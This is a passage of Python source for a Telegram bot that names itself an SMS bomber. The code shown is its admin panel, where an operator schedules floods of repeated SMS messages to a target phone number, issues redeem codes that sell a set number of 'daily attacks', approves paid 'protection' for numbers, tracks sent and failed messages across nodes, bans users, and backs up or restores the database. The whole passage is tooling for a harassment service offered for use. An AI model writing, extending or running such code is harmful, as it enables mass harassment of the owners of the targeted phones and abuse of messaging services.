            styled_box("ᴀᴘᴘʀᴏᴠᴇᴅ",
            f"{ce('shield')} {sc('ʏᴏᴜʀ ɴᴜᴍʙᴇʀ')} <code>{req['number']}</code> {sc('ɪꜱ ɴᴏᴡ ᴘʀᴏᴛᴇᴄᴛᴇᴅ!')}"), parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("admin:prot_reject:"))
async def cb_prot_reject(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()
    req = next((r for r in d["protection_requests"] if r["id"] == req_id), None)
    if not req:
        await cq.answer(sc("ɴᴏᴛ ꜰᴏᴜɴᴅ!"), show_alert=True)
        return
    req["status"] = "rejected"
    save(d)
    await cq.answer(sc("ʀᴇᴊᴇᴄᴛᴇᴅ!"), show_alert=True)
    try:
        await cq.bot.send_message(req["user_id"],
            styled_box("ʀᴇᴊᴇᴄᴛᴇᴅ",
            f"{ce('cross')} {sc('ʏᴏᴜʀ ʀᴇǫᴜᴇꜱᴛ ᴡᴀꜱ ʀᴇᴊᴇᴄᴛᴇᴅ.')}"), parse_mode="HTML")
    except: pass

@R.callback_query(F.data == "admin:schedule")
async def cb_schedule(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.schedule_number)
    await cq.message.edit_text(
        styled_box("ꜱᴄʜᴇᴅᴜʟᴇ ʙᴏᴍʙ",
        f"{ce('link')} {sc('ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ')}"),
        reply_markup=kb([[btn_danger("Cancel", callback="admin:panel", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.schedule_number)
async def process_sched_number(msg: types.Message, state: FSMContext):
    n = msg.text.strip().replace(" ", "")
    if not re.match(r'^\+?[0-9]{8,15}$', n):
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.')}", parse_mode="HTML")
        return
    await state.update_data(sched_number=n)
    await state.set_state(Form.schedule_message)
    await msg.answer(
        styled_box("ᴍᴇꜱꜱᴀɢᴇ",
        f"{ce('fire')} {sc('ᴇɴᴛᴇʀ ꜱᴍꜱ ᴍᴇꜱꜱᴀɢᴇ')}"), parse_mode="HTML")

@R.message(Form.schedule_message)
async def process_sched_message(msg: types.Message, state: FSMContext):
    await state.update_data(sched_message=msg.text.strip())
    await state.set_state(Form.schedule_count)
    await msg.answer(
        styled_box("ᴄᴏᴜɴᴛ", f"{ce('chart')} {sc('ᴇɴᴛᴇʀ ᴄᴏᴜɴᴛ')}"), parse_mode="HTML")

@R.message(Form.schedule_count)
async def process_sched_count(msg: types.Message, state: FSMContext):
    try:
        c = int(msg.text.strip())
        if c < 1 or c > MAX_COUNT:
            raise ValueError
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ.')}", parse_mode="HTML")
        return
    await state.update_data(sched_count=c)
    await state.set_state(Form.schedule_time)
    await msg.answer(
        styled_box("ᴛɪᴍᴇ",
        f"{ce('clock')} {sc('ᴇɴᴛᴇʀ ᴛɪᴍᴇ (ᴇ.ɢ. 30ᴍ, 2ʜ, 1ᴅ)')}"), parse_mode="HTML")

@R.message(Form.schedule_time)
async def process_sched_time(msg: types.Message, state: FSMContext):
    secs = parse_time_string(msg.text.strip())
    if not secs or secs < 5:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ᴛɪᴍᴇ.')}", parse_mode="HTML")
        return
    data = await state.get_data()
    d = load()
    d["schedules"].append({
        "id": str(int(time.time())),
        "number": data["sched_number"],
        "message": data["sched_message"],
        "count": data["sched_count"],
        "time": (datetime.now() + timedelta(seconds=secs)).isoformat(),
        "status": "pending",
        "created_by": msg.from_user.id,
    })
    save(d)
    await state.clear()
    await msg.answer(
        styled_box("ꜱᴄʜᴇᴅᴜʟᴇ ꜱᴀᴠᴇᴅ",
        f"{ce('check')} {sc('ꜱᴄʜᴇᴅᴜʟᴇ ᴄʀᴇᴀᴛᴇᴅ')}\n"
        f"{ce('clock')} {sc('ꜱᴛᴀʀᴛꜱ ɪɴ')} {secs}ꜱ"), parse_mode="HTML")

@R.callback_query(F.data == "admin:schedule_list")
async def cb_schedule_list(cq: types.CallbackQuery):
    d = load()
    scheds = d.get("schedules", [])
    if not scheds:
        await cq.answer(sc("ɴᴏ ꜱᴄʜᴇᴅᴜʟᴇꜱ."), show_alert=True)
        return
    text = styled_box("ꜱᴄʜᴇᴅᴜʟᴇꜱ", "")
    rows = []
    for s in scheds[:10]:
        try:
            rem = int((datetime.fromisoformat(s["time"]) - datetime.now()).total_seconds())
            rem_txt = f"{rem}ꜱ" if rem > 0 else "ᴘᴇɴᴅɪɴɢ"
        except:
            rem_txt = "-"
        text += f"{ce('fire')} {s['number']} | {s['count']} | {rem_txt}\n"
        if s["status"] == "pending":
            rows.append([btn_danger(f"Delete {s['number'][-4:]}", callback=f"admin:sched_del:{s['id']}", emoji_key="cross")])
    rows.append([btn_primary("Back", callback="admin:panel", emoji_key="arrow")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:sched_del:"))
async def cb_sched_del(cq: types.CallbackQuery):
    sid = cq.data.split(":")[2]
    d = load()
    d["schedules"] = [s for s in d.get("schedules", []) if s["id"] != sid]
    save(d)
    await cq.answer(sc("ᴅᴇʟᴇᴛᴇᴅ."), show_alert=True)
    await cb_schedule_list(cq)

@R.callback_query(F.data == "admin:admins")
async def cb_admins(cq: types.CallbackQuery):
    d = load()
    admins = d.get("admins", [OWNER_ID])
    text = styled_box("ᴀᴅᴍɪɴꜱ",
        "\n".join([f"{ce('crown')} <code>{a}</code>" for a in admins]))
    rows = []
    for a in admins:
        if a != OWNER_ID:
            rows.append([btn_danger(f"Remove {a}", callback=f"admin:admin_del:{a}", emoji_key="cross")])
    rows.append([btn_primary("Add Admin", callback="admin:admin_add", emoji_key="crown")])
    rows.append([btn_primary("Back", callback="admin:panel", emoji_key="arrow")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data == "admin:admin_add")
async def cb_admin_add(cq: types.CallbackQuery, state: FSMContext):
    if cq.from_user.id != OWNER_ID:
        await cq.answer(sc("ᴏᴡɴᴇʀ ᴏɴʟʏ!"), show_alert=True)
        return
    await state.set_state(Form.admin_add_id)
    await cq.message.edit_text(
        styled_box("ᴀᴅᴅ ᴀᴅᴍɪɴ",
        f"{ce('crown')} {sc('ꜱᴇɴᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴜꜱᴇʀ ɪᴅ')}"), parse_mode="HTML")

@R.message(Form.admin_add_id)
async def process_admin_add(msg: types.Message, state: FSMContext):
    try:
        aid = int(msg.text.strip())
        d = load()
        if aid not in d.get("admins", []):
            d["admins"].append(aid)
            save(d)
        await state.clear()
        await msg.answer(f"{ce('check')} {sc('ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ')}", reply_markup=admin_panel_kb(d), parse_mode="HTML")
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ɪᴅ.')}", parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:admin_del:"))
async def cb_admin_del(cq: types.CallbackQuery):
    aid = int(cq.data.split(":")[2])
    if aid == OWNER_ID:
        await cq.answer(sc("ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ."), show_alert=True)
        return
    d = load()
    if aid in d.get("admins", []):
        d["admins"].remove(aid)
        save(d)
    await cq.answer(sc("ʀᴇᴍᴏᴠᴇᴅ."), show_alert=True)
    await cb_admins(cq)

@R.callback_query(F.data == "admin:ban")
async def cb_ban(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.ban_user_id)
    await cq.message.edit_text(
        styled_box("ʙᴀɴ ᴜꜱᴇʀ",
        f"{ce('cross')} {sc('ꜱᴇɴᴅ ᴜꜱᴇʀ ɪᴅ ᴛᴏ ʙᴀɴ')}"), parse_mode="HTML")

@R.message(Form.ban_user_id)
async def process_ban(msg: types.Message, state: FSMContext):
    try:
        uid = int(msg.text.strip())
        d = load()
        if uid not in d.get("banned", []):
            d["banned"].append(uid)
            save(d)
        await state.clear()
        await msg.answer(f"{ce('cross')} {sc('ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ')}", reply_markup=admin_panel_kb(d), parse_mode="HTML")
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ɪᴅ.')}", parse_mode="HTML")

@R.callback_query(F.data == "admin:unban")
async def cb_unban(cq: types.CallbackQuery):
    d = load()
    banned = d.get("banned", [])
    if not banned:
        await cq.answer(sc("ɴᴏ ʙᴀɴɴᴇᴅ."), show_alert=True)
        return
    rows = [[btn_success(f"Unban {u}", callback=f"admin:unban_do:{u}", emoji_key="check")] for u in banned]
    rows.append([btn_primary("Back", callback="admin:panel", emoji_key="arrow")])
    await cq.message.edit_text(sc("ᴜɴʙᴀɴ ᴜꜱᴇʀ"), reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:unban_do:"))
async def cb_unban_do(cq: types.CallbackQuery):
    uid = int(cq.data.split(":")[2])
    d = load()
    if uid in d.get("banned", []):
        d["banned"].remove(uid)
        save(d)
    await cq.answer(f"{uid} ᴜɴʙᴀɴɴᴇᴅ.", show_alert=True)
    await cb_unban(cq)

@R.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cq: types.CallbackQuery):
    d = load()
    s = d.get("stats", {})
    total = s.get("total_sent", 0) + s.get("total_failed", 0)
    rate = round(s.get("total_sent", 0) / total * 100, 1) if total else 0
    text = styled_box("ɢʟᴏʙᴀʟ ᴛᴇʟᴇᴍᴇᴛʀʏ",
        f"{ce('fire')} {sc('ɴᴏᴅᴇꜱ')}: <b>{len(d.get('firebases', []))}</b>\n"
        f"{ce('crown')} {sc('ᴀᴅᴍɪɴꜱ')}: <b>{len(d.get('admins', []))}</b>\n"
        f"{ce('cross')} {sc('ʙᴀɴɴᴇᴅ')}: <b>{len(d.get('banned', []))}</b>\n\n"
        f"{ce('green')} {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{s.get('total_sent', 0)}</b>\n"
        f"{ce('red')} {sc('ᴛᴏᴛᴀʟ ꜰᴀɪʟᴇᴅ')}: <b>{s.get('total_failed', 0)}</b>\n"
        f"{ce('chart')} {sc('ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ')}: <b>{rate}%</b>")
    await cq.message.edit_text(text, reply_markup=back_button("admin:panel"), parse_mode="HTML")

@R.callback_query(F.data == "admin:db_tools")
async def cb_db_tools(cq: types.CallbackQuery):
    await cq.message.edit_text(
        styled_box("ᴅᴀᴛᴀʙᴀꜱᴇ ᴛᴏᴏʟꜱ",
        f"{ce('diamond')} {sc('ᴍᴀɴᴀɢᴇ ʙᴏᴛ ᴅᴀᴛᴀʙᴀꜱᴇ')}\n\n"
        f"{ce('check')} {sc('ʙᴀᴄᴋᴜᴘ')}: ᴅᴏᴡɴʟᴏᴀᴅ ᴅᴀᴛᴀ\n"
        f"{ce('warn')} {sc('ʀᴇꜱᴛᴏʀᴇ')}: ᴜᴘʟᴏᴀᴅ ᴅᴀᴛᴀ"),
        reply_markup=kb([
            [btn_primary("Download Backup", callback="admin:db_backup", emoji_key="diamond")],
            [btn_primary("Restore From File", callback="admin:db_restore_prompt", emoji_key="warn")],
            [btn_primary("Back", callback="admin:panel", emoji_key="arrow")],
        ]), parse_mode="HTML")

@R.callback_query(F.data == "admin:db_backup")
async def cb_db_backup(cq: types.CallbackQuery):
    if not os.path.exists(DATA_FILE):
        await cq.answer(sc("ɴᴏ ꜰɪʟᴇ."), show_alert=True)
        return
    await cq.answer(sc("ᴘʀᴇᴘᴀʀɪɴɢ..."))
    try:
        await cq.bot.send_document(cq.from_user.id, FSInputFile(DATA_FILE), caption=sc("ʙᴀᴄᴋᴜᴘ"))
    except Exception as e:
        await cq.answer(f"ᴇʀʀᴏʀ: {e}", show_alert=True)

@R.callback_query(F.data == "admin:db_restore_prompt")
async def cb_db_restore(cq: types.CallbackQuery):
    await cq.message.edit_text(
        styled_box("ʀᴇꜱᴛᴏʀᴇ",
        f"{ce('warn')} {sc('ꜱᴇɴᴅ ᴛʜᴇ ᴊꜱᴏɴ ʙᴀᴄᴋᴜᴘ ꜰɪʟᴇ ʜᴇʀᴇ.')}"),
        reply_markup=kb([[btn_primary("Cancel", callback="admin:db_tools", emoji_key="cross")]]), parse_mode="HTML")

@R.message(F.document)
async def handle_db_restore(msg: types.Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    if msg.document.file_name and msg.document.file_name.endswith('.json'):
        p = f"restore_{msg.document.file_unique_id}.json"
        await msg.bot.download(msg.document.file_id, destination=p)
        try:
            with open(p, "r") as f:
                nd = json.load(f)
            if "admins" in nd and "firebases" in nd:
                save(nd)
                os.remove(p)
                await msg.answer(styled_box("ʀᴇꜱᴛᴏʀᴇᴅ",
                    f"{ce('check')} {sc('ᴅᴀᴛᴀʙᴀꜱᴇ ʀᴇꜱᴛᴏʀᴇᴅ!')}"), parse_mode="HTML")
            else:
                os.remove(p)
                await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ.')}", parse_mode="HTML")
        except Exception as e:
            if os.path.exists(p):
                os.remove(p)
            await msg.answer(f"{ce('cross')} {sc(f'ᴇʀʀᴏʀ: {e}')}", parse_mode="HTML")

@R.callback_query(F.data == "admin:generate_code")
async def cb_gen_code(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.generate_code_name)
    await cq.message.edit_text(
        styled_box("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ",
        f"{ce('diamond')} {sc('ᴇɴᴛᴇʀ ᴄᴜꜱᴛᴏᴍ ɴᴀᴍᴇ')}"), parse_mode="HTML")

@R.message(Form.generate_code_name)
async def proc_code_name(msg: types.Message, state: FSMContext):
    await state.update_data(code_name=msg.text.strip().upper())
    await state.set_state(Form.generate_code_sms)
    await msg.answer(f"{ce('bolt')} {sc('ᴇɴᴛᴇʀ ᴍᴀx ꜱᴍꜱ')}", parse_mode="HTML")

@R.message(Form.generate_code_sms)
async def proc_code_sms(msg: types.Message, state: FSMContext):
    try:
        await state.update_data(max_sms=int(msg.text.strip()))
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ.')}", parse_mode="HTML")
        return
    await state.set_state(Form.generate_code_days)
    await msg.answer(f"{ce('clock')} {sc('ᴇɴᴛᴇʀ ᴅᴀʏꜱ')}", parse_mode="HTML")

@R.message(Form.generate_code_days)
async def proc_code_days(msg: types.Message, state: FSMContext):
    try:
        await state.update_data(days=int(msg.text.strip()))
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ.')}", parse_mode="HTML")
        return
    await state.set_state(Form.generate_code_attacks)
    await msg.answer(f"{ce('fire')} {sc('ᴇɴᴛᴇʀ ᴅᴀɪʟʏ ᴀᴛᴛᴀᴄᴋꜱ')}", parse_mode="HTML")

@R.message(Form.generate_code_attacks)
async def proc_code_attacks(msg: types.Message, state: FSMContext):
    try:
        await state.update_data(daily_attacks=int(msg.text.strip()))
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ.')}", parse_mode="HTML")
        return
    await state.set_state(Form.generate_code_maxusers)
    await msg.answer(f"{ce('eyes')} {sc('ᴇɴᴛᴇʀ ᴍᴀx ᴜꜱᴇʀꜱ')}", parse_mode="HTML")

@R.message(Form.generate_code_maxusers)
async def proc_code_maxusers(msg: types.Message, state: FSMContext):
    try:
        mu = int(msg.text.strip())
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ.')}", parse_mode="HTML")
        return
    data = await state.get_data()
    code = f"{data['code_name']}_{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
    d = load()
    d["redeem_codes"].append({
        "code": code, "custom_name": data["code_name"],
        "max_sms": data["max_sms"], "days": data["days"],
        "daily_attacks": data["daily_attacks"], "max_users": mu,
        "used_count": 0, "used_by": [], "is_active": True,
        "created_by": msg.from_user.id, "created_at": datetime.now().isoformat(),
    })
    save(d)
    await state.clear()
    await msg.answer(
        styled_box("ᴄᴏᴅᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ",
        f"{ce('diamond')} <code>{code}</code>\n"
        f"{ce('fire')} ᴀᴛᴛᴀᴄᴋꜱ: <b>+{data['daily_attacks']}</b>\n"
        f"{ce('clock')} ᴅᴀʏꜱ: <b>{data['days']}</b>\n"
        f"{ce('eyes')} ᴜꜱᴇʀꜱ: <b>{mu}</b>"),
        reply_markup=admin_panel_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "admin:code_history")
async def cb_code_history(cq: types.CallbackQuery):
    d = load()
    codes = d.get("redeem_codes", [])
    if not codes:
        await cq.answer(sc("ɴᴏ ᴄᴏᴅᴇꜱ."), show_alert=True)
        return
    text = styled_box("ᴄᴏᴅᴇ ʜɪꜱᴛᴏʀʏ", "")
    rows = []
    for c in codes[-10:]:
        text += f"{ce('diamond')} <code>{c['code']}</code> ({c['used_count']}/{c['max_users']})\n"
        if c.get("is_active"):
            rows.append([btn_danger(f"Revoke {c['code'][:12]}", callback=f"admin:revoke_code:{c['code']}", emoji_key="cross")])
    rows.append([btn_primary("Back", callback="admin:panel", emoji_key="arrow")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:revoke_code:"))
async def cb_revoke_code(cq: types.CallbackQuery):
    code = cq.data.split(":", 2)[2]
    d = load()
    for c in d["redeem_codes"]:
        if c["code"] == code:
            c["is_active"] = False
            break
    save(d)
    await cq.answer(sc("ʀᴇᴠᴏᴋᴇᴅ."), show_alert=True)
    await cb_code_history(cq)

@R.callback_query(F.data == "admin:broadcast")
async def cb_broadcast(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.broadcast_message)
    await cq.message.edit_text(
        styled_box("ʙʀᴏᴀᴅᴄᴀꜱᴛ",
        f"{ce('loud')} {sc('ꜱᴇɴᴅ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴍᴇꜱꜱᴀɢᴇ')}"),
        reply_markup=kb([[btn_danger("Cancel", callback="admin:panel", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.broadcast_message)
async def proc_broadcast(msg: types.Message, state: FSMContext):
    content = msg.text or msg.caption
    if not content:
        await msg.answer(f"{ce('cross')} {sc('ꜱᴇɴᴅ ᴛᴇxᴛ.')}", parse_mode="HTML")
        return
    await state.clear()
    d = load()
    users = d.get("users", {})
    sent = 0
    failed = 0
    full = styled_box("ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ", content)
    for u in users.keys():
        try:
            await msg.bot.send_message(int(u), full, parse_mode="HTML")
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    await msg.answer(styled_box("ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴅᴏɴᴇ",
        f"{ce('green')} ꜱᴇɴᴛ: <b>{sent}</b>\n{ce('red')} ꜰᴀɪʟᴇᴅ: <b>{failed}</b>"),
        reply_markup=admin_panel_kb(d), parse_mode="HTML")

# ════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"✅ @{me.username} started ({VERSION})")
    if not os.path.exists(DATA_FILE):
        save(default_data())
    asyncio.create_task(schedule_worker(bot))
    try:
        await bot.send_message(OWNER_ID,
            styled_box("ʙᴏᴛ ᴏɴʟɪɴᴇ",
            f"{ce('fire')} {sc('xʙᴏᴍʙ sᴍs ʙᴏᴍʙᴇʀ')} {VERSION}\n"
            f"{ce('link')} @{me.username}"), parse_mode="HTML")
    except: pass
    try:
        await dp.start_polling(bot)
    except Exception as e:
        log.error(f"main: {e}")

if __name__ == "__main__":
    asyncio.run(main())